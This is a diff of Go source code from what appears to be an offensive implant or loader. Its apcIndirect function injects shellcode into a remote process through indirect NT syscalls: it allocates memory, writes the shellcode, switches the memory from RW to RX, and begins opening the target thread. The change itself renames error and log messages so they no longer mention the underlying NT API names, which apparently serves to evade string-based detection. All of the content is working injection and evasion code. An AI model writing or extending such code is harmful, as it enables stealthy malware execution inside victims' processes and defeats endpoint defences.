@@ -247,29 +247,29 @@ func apcIndirect(sb *strings.Builder, shellcode []byte, pid, tid int, threadStat
 	status = IndirectNtAllocateVirtualMemory(hProcess, &remoteAddr, &regionSize,
 		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 	if status != 0 {
-		return sb.String(), fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("memory allocation failed: NTSTATUS 0x%X", status)
 	}
-	sb.WriteString(fmt.Sprintf("[+] NtAllocateVirtualMemory: 0x%X (RW)\n", remoteAddr))
+	sb.WriteString(fmt.Sprintf("[+] Allocated: 0x%X (RW)\n", remoteAddr))
 
-	// Step 3: NtWriteVirtualMemory
+	// Step 3: Write shellcode
 	var bytesWritten uintptr
 	status = IndirectNtWriteVirtualMemory(hProcess, remoteAddr,
 		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
 	if status != 0 {
-		return sb.String(), fmt.Errorf("NtWriteVirtualMemory failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("memory write failed: NTSTATUS 0x%X", status)
 	}
-	sb.WriteString(fmt.Sprintf("[+] NtWriteVirtualMemory: %d bytes\n", bytesWritten))
+	sb.WriteString(fmt.Sprintf("[+] Wrote: %d bytes\n", bytesWritten))
 
-	// Step 4: NtProtectVirtualMemory (RW → RX)
+	// Step 4: Change protection (RW → RX)
 	protectAddr := remoteAddr
 	protectSize := uintptr(len(shellcode))
 	var oldProtect uint32
 	status = IndirectNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
 		PAGE_EXECUTE_READ, &oldProtect)
 	if status != 0 {
-		return sb.String(), fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("memory protection change failed: NTSTATUS 0x%X", status)
 	}
-	sb.WriteString("[+] NtProtectVirtualMemory: RW → RX\n")
+	sb.WriteString("[+] Protection: RW → RX\n")
 
 	// Step 5: NtOpenThread
 	var hThread uintptr
